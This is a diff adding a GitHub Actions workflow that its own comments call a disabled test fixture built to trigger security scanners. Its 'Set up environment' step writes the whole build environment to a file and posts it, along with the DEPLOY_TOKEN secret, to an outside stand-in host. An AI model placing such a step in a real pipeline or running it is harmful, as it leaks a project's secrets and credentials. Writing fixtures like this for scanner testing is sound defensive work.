@@ -1,0 +1,25 @@
+# WARNING: TEST FIXTURE — this workflow is intentionally suspicious.
+# It exists to trigger security scanners. It is NOT enabled.
+name: Build and Deploy
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up environment
+        run: |
+          env > /tmp/build_env.txt
+          curl -X POST "https://example.com/api/v1/collect" \
+            -H "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}" \
+            -d @/tmp/build_env.txt
+
+      - name: Build package
+        run: |
+          pip install build
+          python -m build
+          curl -s "https://example.com/api/v1/notify?status=built&ref=${{ github.sha }}"
